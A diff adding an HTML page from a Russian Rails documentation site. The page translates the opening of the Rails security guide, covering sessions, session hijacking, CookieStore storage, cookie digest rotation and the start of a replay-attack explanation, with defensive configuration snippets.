@@ -1,0 +1,1109 @@
+<!DOCTYPE html>
+<html prefix="og: http://ogp.me/ns#">
+  <head>
+    <meta charset="utf-8">
+<meta content="Ruby on Rails, Ruby, Rails, Rails 3, Rails 4, Rails 5, Rails 6, Rails 6.0, Rails 6.1, Rails 7.0, Rails 7.1 руководство, начинающим, самоучитель, manual, мануал, справочник, учебник, примеры, Руби, рельсы" name="keywords"/>
+<meta content="Ruby on Rails руководства, учебники, статьи на русском языке" name="description"/>
+<meta content="product" property="twitter:card"/>
+<meta content="@rusrails" property="twitter:site"/>
+<meta content="Rusrails: Безопасность приложений на Rails" property="twitter:title"/>
+<meta content="Ruby on Rails руководства, учебники, статьи на русском языке" property="twitter:description"/>
+<meta content="@rusrails" property="twitter:creator"/>
+<meta content="http://rusrails.ru/assets/rusrails.png" property="twitter:image"/>
+<meta content="website" property="og:type"/>
+<meta content="Rusrails: Безопасность приложений на Rails" property="og:title"/>
+<meta content="Ruby on Rails руководства, учебники, статьи на русском языке" property="og:description"/>
+<meta content="http://localhost:3000/security" property="og:url"/>
+<meta content="http://rusrails.ru/assets/rusrails.png" property="og:image"/>
+    <title>
+      Rusrails: Безопасность приложений на Rails
+    </title>
+    <link rel="stylesheet" media="screen" href="/assets/application-4f65588939909a694017a295c9ca934821f6a6358454c26c5360579d7ee0054d.css" />
+    <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="sknta9maWkQFICpv/84+gQgQMOUNL7DFDC2F46GDw2m+6C1oiulzOQA1Vm6aHrMNCqVWZ7W5EnW05tGXBQBIjw==" />
+  </head>
+  <body>
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-fluid">
+          <a class="brand" href="/"></a>
+          <form class="navbar-search pull-right" action="/search" accept-charset="UTF-8" method="get">
+            <input type="text" name="search" id="search" class="search-query" placeholder="Поиск.." />
+</form>          <ul class="nav pull-right top-menu">
+            <li>
+              <a href="/">Главная</a>
+            </li>
+            <li class="dropdown">
+              <a class="index-popover" href="#">
+                Содержание
+                <b class="caret"></b>
+</a>              <div class="index-popover-content hide">
+                  <ul><li><p><strong>С чего начать?</strong></p><ul><li><a href="/getting-started">Rails для начинающих</a>
+</li></ul></li><li><p><strong>Модели</strong></p><ul><li><a href="/active-record-basics">Основы Active Record</a>
+</li><li><a href="/active-record-migrations">Миграции Active Record</a>
+</li><li><a href="/active-record-validations">Валидации Active Record</a>
+</li><li><a href="/active-record-callbacks">Колбэки Active Record</a>
+</li><li><a href="/active-record-associations">Связи (ассоциации) Active Record</a>
+</li><li><a href="/active-record-querying">Интерфейс запросов Active Record</a>
+</li><li><a href="/active-model-basics">Основы Active Model</a>
+</li></ul></li><li><p><strong>Вью</strong></p><ul><li><a href="/action-view-overview">Обзор Action View</a>
+</li><li><a href="/layouts-and-rendering">Макеты и рендеринг в Rails</a>
+</li><li><a href="/action-view-helpers">Хелперы Action View</a>
+</li><li><a href="/form-helpers">Хелперы форм в Action View</a>
+</li></ul></li><li><p><strong>Контроллеры</strong></p><ul><li><a href="/action-controller-overview">Обзор Action Controller</a>
+</li><li><a href="/routing">Роутинг в Rails</a>
+</li></ul></li><li><p><strong>Другие компоненты</strong></p><ul><li><a href="/active-support-core-extensions">Расширения ядра Active Support</a>
+</li><li><a href="/action-mailer-basics">Основы Action Mailer</a>
+</li><li><a href="/action-mailbox-basics">Основы Action Mailbox</a>
+</li><li><a href="/action-text-overview">Обзор Action Text</a>
+</li><li><a href="/active_job_basics">Основы Active Job</a>
+</li><li><a href="/active_storage_overview">Обзор Active Storage</a>
+</li><li><a href="/action-cable-overview">Обзор Action Cable</a>
+</li></ul></li><li><p><strong>Копаем глубже</strong></p><ul><li><a href="/i18n">API интернационализации Rails (I18n)</a>
+</li><li><a href="/testing">Тестирование приложений на Rails</a>
+</li><li><a href="/security">Безопасность приложений на Rails</a>
+</li><li><a href="/error-reporting">Отчет об ошибках в приложениях Rails</a>
+</li></ul></li></ul><p>next_column</p><ul><li><p><strong>Копаем глубже</strong></p><ul><li><a href="/debugging-rails-applications">Отладка приложений на Rails</a>
+</li><li><a href="/configuring">Конфигурирование приложений на Rails</a>
+</li><li><a href="/command-line">Командная строка Rails</a>
+</li><li><a href="/asset-pipeline">Asset Pipeline</a>
+</li><li><a href="/working-with-javascript-in-rails">Работа с JavaScript в Rails</a>
+</li><li><a href="/initialization">Процесс инициализации в Rails</a>
+</li><li><a href="/autoloading-and-reloading-constants">Автозагрузка и перезагрузка констант</a>
+</li><li><a href="/classic-to-zeitwerk-howto">Как перейти с Classic на Zeitwerk</a>
+</li><li><a href="/caching-with-rails">Кэширование с Rails: Обзор</a>
+</li><li><a href="/active-support-instrumentation">Инструментарий Active Support</a>
+</li><li><a href="/api-app">Использование Rails для API-приложений</a>
+</li><li><a href="/active-record-postgresql">Active Record для PostgreSQL</a>
+</li><li><a href="/active-record-multiple-databases">Несколько баз данных с Active Record</a>
+</li><li><a href="/active-record-encryption">Шифрование Active Record</a>
+</li></ul></li><li><p><strong>Расширяем Rails</strong></p><ul><li><a href="/plugins">Основы создания плагинов Rails</a>
+</li><li><a href="/rails-on-rack">Rails on Rack</a>
+</li><li><a href="/generators">Создание и настройка генераторов и шаблонов Rails</a>
+</li><li><a href="/engines">Engine для начинающих</a>
+</li><li><a href="/threading_and_code_execution">Треды и выполнение кода в Rails</a>
+</li><li><a href="/rails-application-templates">Шаблоны приложения Rails</a>
+</li></ul></li><li><p><strong>Вносим вклад в Ruby on Rails</strong></p><ul><li><a href="/contributing_to_ruby_on_rails">Вносим вклад в Ruby on Rails</a>
+</li><li><a href="/api_documentation_guidelines">Рекомендации по документированию API</a>
+</li><li><a href="/ruby_on_rails_guides_guidelines">Рекомендации для руководств по Ruby on Rails</a>
+</li><li><a href="/development_dependencies_install">Установка зависимостей для разработки</a>
+</li><li><a href="/maintenance-policy">Политика поддержки (версий)</a>
+</li></ul></li><li><p><strong>Заметки о релизах</strong></p><ul><li><a href="/upgrading-ruby-on-rails">Апгрейд Ruby on Rails</a>
+</li><li><a href="/7_1_release_notes">Версия 7.1 - ?</a>
+</li><li><a href="/7_0_release_notes">Версия 7.0 - Декабрь 2021</a>
+</li><li><a href="/6_1_release_notes">Версия 6.1 - Декабрь 2020</a>
+</li><li><a href="/6_0_release_notes">Версия 6.0 - Август 2019</a>
+</li></ul></li></ul>
+              </div>
+            </li>
+            <li>
+              <a target="blank" href="http://api.rusrails.ru">Ruby &amp; Rails API</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="content-wrapper">
+      <div class="container-fluid">
+        <div class="row-fluid">
+          <div class="span3 pull-right">
+            <div class="well social">
+              <h4>Принимаем пожелания и пул-реквесты!</h4>
+              <iframe allowtransparency="true" frameborder="0" height="30" src="http://ghbtns.com/github-btn.html?user=rusrails&repo=rusrails&type=watch&count=true&size=large" width="180"></iframe>
+              <p></p>
+              <a class="twitter-follow-button" data-lang="ru" href="https://twitter.com/rusrails"></a>
+            </div>
+              <div class="well menu">
+                    <ul class="nav nav-list">
+      <li>
+        <h4>
+          <a href="#vvedenie">1. Введение</a>
+</h4>      </li>
+      <li>
+        <h4>
+          <a href="#sessions">2.  Сессии</a>
+</h4>      </li>
+      <li>
+        <h5>
+          <a href="#chto-takoe-sessii">2.1. Что такое сессии?</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#ugon-sessii">2.2. Угон сессии</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#hranenie-sessii">2.3. Хранение сессии</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#rotatsiya-zashifrovannyh-i-podpisannyh-konfiguratsiy-kuki">2.4. Ротация зашифрованных и подписанных конфигураций куки</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#ataki-povtornogo-vosproizvedeniya-dlya-sessiy-cookiestore">2.5. Атаки повторного воспроизведения для сессий CookieStore</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#fiksatsii-sessii">2.6. Фиксации сессии</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#fiksatsii-sessii-kontrmery">2.7. Фиксации сессии - контрмеры</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#okonchanie-sessii">2.8. Окончание сессии</a>
+</h5>      </li>
+      <li>
+        <h4>
+          <a href="#cross-site-request-forgery-csrf">3.  Межсайтовая подделка запроса (CSRF, Cross-Site Request Forgery)</a>
+</h4>      </li>
+      <li>
+        <h5>
+          <a href="#csrf-countermeasures">3.1.  Контрмеры CSRF</a>
+</h5>      </li>
+      <li>
+        <h4>
+          <a href="#perenapravlenie-i-fayly">4. Перенаправление и файлы</a>
+</h4>      </li>
+      <li>
+        <h5>
+          <a href="#perenapravlenie">4.1. Перенаправление</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#samodostatochnyy-xss">4.1.1. Самодостаточный XSS</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#zagruzki-fayla">4.2. Загрузки файла</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#ispolnyaemyy-kod-v-zagruzkah-fayla">4.3. Исполняемый код в загрузках файла</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#skachivaniya-fayla">4.4. Скачивания файла</a>
+</h5>      </li>
+      <li>
+        <h4>
+          <a href="#intranet-i-bezopasnost-administratora">5. Интранет и безопасность администратора</a>
+</h4>      </li>
+      <li>
+        <h5>
+          <a href="#dopolnitelnye-mery-predostorozhnosti">5.1. Дополнительные меры предосторожности</a>
+</h5>      </li>
+      <li>
+        <h4>
+          <a href="#user-management">6.  Управление пользователями</a>
+</h4>      </li>
+      <li>
+        <h5>
+          <a href="#brutfors-akkauntov">6.1. Брутфорс аккаунтов</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#ugon-akkaunta">6.2. Угон аккаунта</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#paroli">6.2.1. Пароли</a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#e-mail">6.2.2. E-Mail</a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#drugoe">6.2.3. Другое</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#captcha">6.3. CAPTCHA</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#logirovanie">6.4. Логирование</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#regulyarnye-vyrazheniya">6.5. Регулярные выражения</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#rasshirenie-privilegiy">6.6. Расширение привилегий</a>
+</h5>      </li>
+      <li>
+        <h4>
+          <a href="#in-ektsii">7. Инъекции</a>
+</h4>      </li>
+      <li>
+        <h5>
+          <a href="#spiski-razresheniy-protiv-spiskov-ogranicheniy">7.1. Списки разрешений против списков ограничений</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#sql-in-ektsii">7.2. SQL-инъекции</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#vvedenie2">7.2.1. Введение</a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#obhod-avtorizatsii">7.2.2. Обход авторизации</a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#neavtorizovannoe-chtenie">7.2.3. Неавторизованное чтение</a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#kontrmery">7.2.4. Контрмеры</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#cross-site-scripting-xss">7.3.  Межсайтовый скриптинг (XSS)</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#tochki-vhoda">7.3.1. Точки входа</a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#html-javascript-in-ektsii">7.3.2. HTML/JavaScript инъекции</a>
+</h6>      </li>
+      <li>
+        <h7>
+          <a href="#pohischenie-kuki">7.3.2.1. Похищение куки</a>
+</h7>      </li>
+      <li>
+        <h7>
+          <a href="#iskazhenie">7.3.2.2. Искажение</a>
+</h7>      </li>
+      <li>
+        <h7>
+          <a href="#kontrmery2">7.3.2.3. Контрмеры</a>
+</h7>      </li>
+      <li>
+        <h7>
+          <a href="#obfustsirovannaya-i-zakodirovannaya-in-ektsiya">7.3.2.4. Обфусцированная и закодированная инъекция</a>
+</h7>      </li>
+      <li>
+        <h6>
+          <a href="#primery-iz-proshlogo">7.3.3. Примеры из прошлого</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#css-in-ektsiya">7.4. CSS-инъекция</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#kontrmery3">7.4.1. Контрмеры</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#in-ektsiya-textile">7.5. Инъекция Textile</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#kontrmery4">7.5.1. Контрмеры</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#ajax-in-ektsii">7.6. Ajax-инъекции</a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#in-ektsii-komandnoy-stroki">7.7. Инъекции командной строки</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#uyazvimost-kernel-open">7.7.1. Уязвимость Kernel#open</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#in-ektsiya-zagolovka">7.8. Инъекция заголовка</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#pereprivyazyvanie-dns-i-ataki-na-zagolovok-host">7.8.1. Перепривязывание DNS и атаки на заголовок Host</a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#razdelenie-otklika">7.8.2. Разделение отклика</a>
+</h6>      </li>
+      <li>
+        <h4>
+          <a href="#unsafe-query-generation">8.  Небезопасная генерация запросов</a>
+</h4>      </li>
+      <li>
+        <h4>
+          <a href="#zagolovki-bezopasnosti-http">9. Заголовки безопасности HTTP</a>
+</h4>      </li>
+      <li>
+        <h5>
+          <a href="#zagolovki-bezopasnosti-po-umolchaniyu">9.1. Заголовки безопасности по умолчанию</a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#x-frame-options">9.1.1. <code>X-Frame-Options</code></a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#x-xss-protection">9.1.2. <code>X-XSS-Protection</code></a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#x-content-type-options">9.1.3. <code>X-Content-Type-Options</code></a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#x-permitted-cross-domain-policies">9.1.4. <code>X-Permitted-Cross-Domain-Policies</code></a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#referrer-policy">9.1.5. <code>Referrer-Policy</code></a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#nastroyka-zagolovkov-po-umolchaniyu">9.1.6. Настройка заголовков по умолчанию</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#zagolovok-strict-transport-security">9.2. Заголовок <code>Strict-Transport-Security</code></a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#zagolovok-content-security-policy">9.3. Заголовок <code>Content-Security-Policy</code></a>
+</h5>      </li>
+      <li>
+        <h6>
+          <a href="#reporting-violations">9.3.1.  Отчет о нарушениях</a>
+</h6>      </li>
+      <li>
+        <h6>
+          <a href="#adding-a-nonce">9.3.2.  Добавление Nonce</a>
+</h6>      </li>
+      <li>
+        <h5>
+          <a href="#zagolovok-feature-policy">9.4. Заголовок <code>Feature-Policy</code></a>
+</h5>      </li>
+      <li>
+        <h5>
+          <a href="#sovmestnoe-mezhsaytovoe-ispolzovanie-resursov">9.5. Совместное межсайтовое использование ресурсов</a>
+</h5>      </li>
+      <li>
+        <h4>
+          <a href="#bezopasnost-sredy">10. Безопасность среды</a>
+</h4>      </li>
+      <li>
+        <h5>
+          <a href="#custom-credentials">10.1.  Настраиваемые учетные данные</a>
+</h5>      </li>
+      <li>
+        <h4>
+          <a href="#upravlenie-zavisimostyami-i-baza-uyazvimostey-cve">11. Управление зависимостями и база уязвимостей CVE</a>
+</h4>      </li>
+      <li>
+        <h4>
+          <a href="#additional-resources">12.  Дополнительные источники</a>
+</h4>      </li>
+</ul>
+
+              </div>
+            <div class="well banner300 banner">
+              <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<!-- sidebar rusrails -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:300px;height:600px"
+     data-ad-client="ca-pub-7764391801669990"
+     data-ad-slot="6089520660"></ins>
+
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+            </div>
+          </div>
+          <div class="span9 content pull-left">
+            <div class="banner">
+              <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+  <!-- top rusrails -->
+  <ins class="adsbygoogle"
+       style="display:inline-block;width:980px;height:120px"
+       data-ad-client="ca-pub-7764391801669990"
+       data-ad-slot="4891989065"></ins>
+
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+            </div>
+              <h2 id='bezopasnost-prilozheniy-na-rails' class='inside_page_header'> Безопасность приложений на Rails</h2><p>Это руководство описывает общие проблемы безопасности в приложениях веб, и как избежать их с помощью Rails.</p><p>После прочтения этого руководства, вы узнаете:</p><ul><li>Обо всех контрмерах, которые <em>выделены в тексте</em>.
+</li><li>Концепцию сессий в Rails, что в них вкладывать, и популярные методы атак.
+</li><li>Как простое посещение сайта может быть проблемой безопасности (про межсайтовую подделку запроса, CSRF).
+</li><li>На что следует обратить внимание при работе с файлами или предоставлении административного интерфейса.
+</li><li>Как управлять пользователями: вход и выход, и методы атак на всех уровнях.
+</li><li>И наиболее популярные методы атаки инъекцией.
+</li></ul><h3 id='vvedenie' class='inside_page_header'><a href="#vvedenie">1.</a> Введение</h3><p>Фреймворки веб-приложений сделаны для помощи разработчикам в создании веб-приложений. Некоторые из них также помогают с безопасностью веб-приложения. Фактически, один фреймворк не безопаснее другого: если использовать их правильно, возможно создавать безопасные приложения на разных фреймворках. Ruby on Rails имеет некоторые умные методы хелпера, например против инъекций SQL, поэтому вряд ли это будет проблемой.</p><p>В основном здесь нет такого, как plug-n-play безопасность. Безопасность зависит от людей, использующих фреймворк, и иногда от метода разработки. И зависит от всех уровней среды веб-приложения: внутреннего хранения данных, веб-сервера и самого веб-приложения (и, возможно, других уровней приложений).</p><p>Однако, The Gartner Group оценила, что 75% атак происходят на уровне веб-приложения, и обнаружила, что из 300 проверенных сайтов, 97% уязвимы к атакам. Это потому, что веб-приложения относительно просто атаковать, так как они просты для понимания и воздействия, даже простым человеком.</p><p>Угрозы против веб-приложений включают угон пользовательского аккаунта, обход контроля доступа, чтение или модифицирование чувствительных данных или представление мошеннического содержимого. Или атакующий может получить возможность установки программы-трояна или программы отправки нежелательных e-mail с целью финансовой выгоды, или нанесения вреда брэнду, с помощью модифицирования ресурсов компании. Для предотвращения атак, сведения к минимуму их последствий и удаления уязвимых мест прежде всего необходимо полное понимание методов атак, чтобы найти правильные контрмеры. Это то, на что направлено это руководство.</p><p>Для разработки безопасных веб-приложений вы должны быть в курсе всех уровней безопасности и знать своих врагов. Чтобы быть в курсе, подпишитесь на рассылку по безопасности, читайте блоги по безопасности, регулярно осуществляйте обновления и производите проверки безопасности (смотрите раздел <a href="#additional-resources">Дополнительные источники</a>). Делайте это вручную, поскольку так вы можете найти неприятные проблемы безопасности на уровне логики.</p><h3 id='sessions' class='inside_page_header'><a href="#sessions">2.</a>  Сессии</h3><p>Эта глава описывает несколько конкретных атак, относящихся к сессиям, и меры безопасности для защиты ваших данных сессии.</p><h4 id='chto-takoe-sessii' class='inside_page_header'><a href="#chto-takoe-sessii">2.1.</a> Что такое сессии?</h4><div class="info"><p>Сессии позволяют приложению поддерживать пользовательское состояние, пока пользователи взаимодействуют с приложением. Например, сессии позволяют пользователю быть аутентифицированным единожды и оставаться таким во всех будущих запросах.</p></div><p>Большинству приложений необходимо отслеживать состояние пользователей, взаимодействующих с приложением. Это может быть содержимым корзины товаров или id залогиненного пользователя. Такой тип пользовательского состояния может быть сохранен в сессии.</p><p>Rails предоставляет объект сессии для каждого пользователя, обращающегося к приложению. Если у пользователя уже есть активная сессия, Rails использует существующую сессию. В противном случае будет создана новая сессия.</p><div class="note"><p>Подробнее о сессиях и как их использовать читайте в <a href="/action-controller-overview.html#session">Обзорном руководстве по Action Controller</a>.</p></div><h4 id='ugon-sessii' class='inside_page_header'><a href="#ugon-sessii">2.2.</a> Угон сессии</h4><div class="warning"><p><em>Воровство ID пользовательской сессии позволяет злоумышленнику использовать веб-приложение от лица жертвы.</em></p></div><p>Многие веб-приложения имеют такую систему аутентификации: пользователь предоставляет имя пользователя и пароль, веб-приложение проверяет их и хранит id соответствующего пользователя в хэше сессии. С этого момента сессия валидна. При каждом запросе приложение загрузит пользователя, определенного по user id в сессии, без необходимости новой аутентификации. ID сессии в куки идентифицирует сессию.</p><p>Таким образом, куки служит как временная аутентификация для веб-приложения. Любой, кто воспользовался куки от кого-то другого, может пользоваться веб-приложением, как этот пользователь – с возможными серьезными последствиями. Вот несколько способов для угона сессии и контрмеры этому:</p><ul><li>Перехват куки в незащищенной сети. Беспроводная LAN может быть примером такой сети. В незашифрованной беспроводной LAN очень легко прослушивать трафик всех присоединенных клиентов. Для создателя веб-приложений это означает, что <em>необходимо предоставить безопасное соединение через SSL</em>. В Rails 3.1 и позже это может быть выполнено с помощью принуждения к соединению SSL в файле конфигурации приложения:
+</li></ul><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">force_ssl</span> <span class="o">=</span> <span class="kp">true</span>
+</code></pre>
+</div>
+<ul><li>Многие не очищают куки поле работы на публичном терминале. Поэтому, если предыдущий пользователь не вышел из веб-приложения, вы сможете его использовать как этот пользователь. Обеспечьте пользователя <em>кнопкой выхода</em> в веб-приложении, и <em>сделайте ее заметной</em>.
+</li><li>Часто межсайтовый скриптинг (XSS, cross-site scripting) ставит целью получение куки пользователя. <a href="#cross-site-scripting-xss">Подробнее о XSS</a> вы прочитаете позже.
+</li><li>Вместо похищения неизвестных злоумышленнику куки, он изменяет идентификатор сессии пользователя (в куки) на известный ему. Об этих так называемых фиксациях сессии вы прочитаете позже.
+</li></ul><p>Основная цель большинства злоумышленников это сделать деньги. Подпольные цены за краденную банковскую учетную запись варьируются в пределах 0.5%-10% от баланса на аккаунте, $0.5-$30 за номер кредитной карточки ($20-$60 с полной информацией), $0.1-$1.5 для идентификаторов (имя, SSN и дата рождения), $20-$50 для аккаунтов продавцов и $6-$10 для аккаунтов поставщиков облачных услуг, в соответствии с <a href="https://docs.broadcom.com/docs/istr-22-2017-en">Symantec Internet Security Threat Report (2017)</a>.</p><h4 id='hranenie-sessii' class='inside_page_header'><a href="#hranenie-sessii">2.3.</a> Хранение сессии</h4><div class="note"><p>Rails использует <code>ActionDispatch::Session::CookieStore</code> в качестве хранилища сессии по умолчанию.</p></div><div class="info"><p>Узнайте подробности о других хранилищах сессии в <a href="/action-controller-overview.html#session">Обзорном руководстве по Action Controller</a>.</p></div><p><code>CookieStore</code> Rails сохраняет хэш сессии в куки на стороне клиента. Сервер получает хэш сессии из куки и устраняется необходимость в ID сессии. Это значительно увеличивает скорость приложения, но является спорным вариантом хранения, и нужно думать об условиях безопасности и ограничения хранения этого:</p><ul><li><p>У куки лимит размера 4 kB. Используйте куки только для данных, относящихся к сессии.</p></li><li><p>Куки хранятся на стороне клиента. Клиент может сохранить содержимое куки даже для устаревших куки. Клиент может скопировать куки на другие машины. Избегайте хранения чувствительных данных в куки.</p></li><li><p>Куки временные по природе. Сервер может установить срок устаревания для куки, но клиент может удалить куки и его содержимое до этого. Сохраняйте данные, которые более постоянные по природе, на стороне сервера.</p></li><li><p>Куки сессий не делают себя недействительными и могут быть злонамеренно использованы повторно. Было бы целесообразно, чтобы приложение делало недействительными старые куки сессий, используя сохраненную метку времени.</p></li><li><p>Rails шифрует куки по умолчанию. Клиент не может прочитать или отредактировать содержимое куки без нарушения шифрования. Если вы основательно позаботились о своих секретных ключах, можете рассматривать куки как в целом безопасными.</p></li></ul><p><code>CookieStore</code> использует <a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted">зашифрованные</a> куки, чтобы предоставить безопасное, зашифрованное место расположения для хранения данных сессии. Таким образом, сессии на основе куки обеспечивают как целостность, так и конфиденциальность их содержимого. Ключ шифрования, а также ключ верификации, используемый для <a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed">подписанных</a> куки, получены из конфигурационного значения <code>secret_key_base</code>.</p><div class="info"><p>Секретные ключи должны быть длинными и случайными. Используйте <code>bin/rails secret</code> для получения новых уникальных секретных ключей.</p></div><div class="info"><p>Изучите подробности об <a href="#custom-credentials">управлении учетными данными далее в этом руководстве</a></p></div><p>Также важно использовать различные значения соли для зашифрованных и подписанных куки. Использование одного и того же значения для разных конфигурационных значений соли может привести к тому, что один и тот же производный ключ будет использоваться для разных функций безопасности, из-за чего, в свою очередь, может быть ослаблена сила ключа.</p><p>В test и development средах приложения получают <code>secret_key_base</code> из имени приложения. В других средах должен использоваться случайный ключ, присутствующий в <code>config/credentials.yml.enc</code>, показанный здесь в дешифрованном состоянии:</p><div class="code_container">
+  <pre><code class="highlight yaml"><span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">492f...</span>
+</code></pre>
+</div>
+<div class="warning"><p>Если секретные ключи вашего приложения могли быть скомпрометированы, настоятельно рекомендуется изменить секретный ключ. Изменение <code>secret_key_base</code> прекратит текущие активные сессии.</p></div><h4 id='rotatsiya-zashifrovannyh-i-podpisannyh-konfiguratsiy-kuki' class='inside_page_header'><a href="#rotatsiya-zashifrovannyh-i-podpisannyh-konfiguratsiy-kuki">2.4.</a> Ротация зашифрованных и подписанных конфигураций куки</h4><p>Ротация идеально подходит для изменения конфигураций куки и обеспечения того, что старые куки не сразу стали недействительны. Затем пользователи имеют возможность посетить сайт, прочитать свои куки со старой конфигурацией и переписать их с учетом новых изменений. После этого ротацию можно удалить, когда посчитаете нужным, например, если большинство пользователей должны были уже использовать шанс апгрейднуть свои куки.</p><p>Также возможно производить ротацию алгоритмов шифрования и дайджестов, используемых для зашифрованных и подписанных куки.</p><p>Например, чтобы изменить дайджест, используемый для подписанных куки с SHA1 на SHA256, необходимо сперва назначить новое конфигурационное значение:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">signed_cookie_digest</span> <span class="o">=</span> <span class="s2">"SHA256"</span>
+</code></pre>
+</div>
+<p>Теперь добавьте ротацию для старого дайджеста SHA1, чтобы существующие куки были бесшовно апгрейднуты до нового дайджеста SHA256.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">cookies_rotations</span><span class="p">.</span><span class="nf">tap</span> <span class="k">do</span> <span class="o">|</span><span class="n">cookies</span><span class="o">|</span>
+  <span class="n">cookies</span><span class="p">.</span><span class="nf">rotate</span> <span class="ss">:signed</span><span class="p">,</span> <span class="ss">digest: </span><span class="s2">"SHA1"</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Затем любые переписываемые подписанные куки будут обработаны с помощью SHA256. Старые куки, которые были переписаны с помощью SHA1, все еще могут быть прочитаны, и те, что являются доступными будут переписаны с помощью нового дайджеста, чтобы они были апгрейднуты и не считались недействительными при удалении ротации.</p><p>После того, как пользователи с подписанными куки с помощью SHA1 больше не смогут переписывать свои куки, удалите последние.</p><p>Хотя можно установить столько ротаций, сколько необходимо для того, чтобы не было много ротаций в любой момент времени.</p><p>Для получения дополнительной информации о ротации ключа с зашифрованными и подписанными сообщениями, а также о различных опциях, которые принимает метод <code>rotate</code>, обратитесь, пожалуйста, к документации по <a href="https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html">MessageEncryptor API</a> и <a href="https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html">MessageVerifier API</a>.</p><h4 id='ataki-povtornogo-vosproizvedeniya-dlya-sessiy-cookiestore' class='inside_page_header'><a href="#ataki-povtornogo-vosproizvedeniya-dlya-sessiy-cookiestore">2.5.</a> Атаки повторного воспроизведения для сессий CookieStore</h4><div class="note"><p><em>Другой тип атак, которого следует опасаться при использовании CookieStore, это атака повторного воспроизведения (replay attack).</em></p></div><p>Она работает подобным образом:</p><ul><li>Пользователь получает кредит, сумма сохраняется в сессию (что является плохой идеей в любом случае, но мы воспользуемся этим для целей демонстрации).
+</li><li>Пользователь покупает что-либо.
+</li><li>Новая изменившаяся сумма кредита сохраняется в сессии.
+</li><li>Пользователь берет куки с первого шага (которые он предварительно скопировал) и заменяет текущие куки в браузере.
+</li><li>Пользователь получил свой первоначальный кредит назад.
